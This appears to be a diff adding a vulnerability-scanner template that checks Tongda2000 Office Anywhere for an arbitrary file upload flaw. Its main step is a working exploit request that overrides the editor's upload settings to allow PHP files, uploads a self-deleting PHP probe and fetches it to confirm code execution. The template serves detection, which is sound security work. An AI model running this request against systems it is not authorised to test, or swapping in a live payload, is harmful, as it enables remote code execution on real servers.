@@ -1,0 +1,53 @@
+id: tongda2000-office_anywhere-file_upload
+info:
+  name: Tongda2000 Office Anywhere File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in Tongda2000 Office Anywhere. The vulnerability allows uploading arbitrary files which can lead to remote code execution.
+http:
+  - id: check-office-anywhere
+    method: GET
+    path:
+      - '{{BaseURL}}/inc/expired.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'Office Anywhere 2017'
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/module/ueditor/php/action_upload.php?action=uploadfile'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}'
+      X-Requested-With: XMLHttpRequest
+    body: |
+      ------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\r\n\r\nffff\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\r\n\r\n1000000000\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\r\n\r\n{{randname}}\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\r\n\r\n.php\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="ffff"; filename="test.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5({{randomInt}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{boundary}}\r\nContent-Disposition: form-data; name="mufile"\r\n\r\nsubmit\r\n------WebKitFormBoundary{{boundary}}--\r\n
+    extractors:
+      - type: regex
+        name: uploaded-file
+        part: body
+        regex:
+          - '(https?://.*?{{randname}}\.php)'
+        internal: true
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/{{randname}}.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '{{md5(randomInt)}}'
+variables:
+  randomInt: '{{rand_int(40000, 44800)}}'
+  boundary: '{{rand_text_alphanumeric(8)}}'
+  randname: '{{rand_text_alphanumeric(6)}}'
